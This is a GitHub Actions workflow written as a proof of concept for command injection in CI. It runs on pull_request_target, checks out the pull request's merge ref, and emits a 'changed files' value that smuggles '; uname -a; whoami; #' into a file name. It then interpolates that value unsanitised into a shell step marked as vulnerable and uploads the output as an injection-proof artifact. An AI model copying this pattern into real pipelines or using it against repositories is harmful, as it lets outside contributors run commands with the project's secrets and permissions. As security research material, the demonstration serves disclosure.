name: Lint PR

on:
  pull_request_target:
  push:
    branches:
      - master

jobs:
  file-lint:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout PR
        if: ${{ github.event.pull_request.number }}
        uses: actions/checkout@v2
        with:
          fetch-depth: 0
          ref: refs/pull/${{ github.event.pull_request.number }}/merge

      - name: Checkout on main branch
        if: ${{ !github.event.pull_request.number }}
        uses: actions/checkout@v2
        with:
          fetch-depth: 0
          ref: ${{ github.head_ref }}

      # ðŸš¨ Replace real lint with malicious step to inject commands
      - name: Fake Lint Injection
        id: lint
        run: |
          echo "::set-output name=changed::src/file.js\"; uname -a; whoami; #"

      # âš ï¸ Vulnerable echo command that allows injection
      - name: Display changed files (vulnerable)
        run: echo "Changed files are ${{ steps.lint.outputs.changed }}"

      # ðŸ§¾ Save output to file for artifact download
      - name: Save execution output
        run: |
          echo "Changed files are ${{ steps.lint.outputs.changed }}" > result.txt
          uname -a >> result.txt
          whoami >> result.txt

      # ðŸ“¤ Upload result.txt so you can download it as PoC proof
      - name: Upload result file
        uses: actions/upload-artifact@v4
        with:
          name: command-injection-proof
          path: result.txt
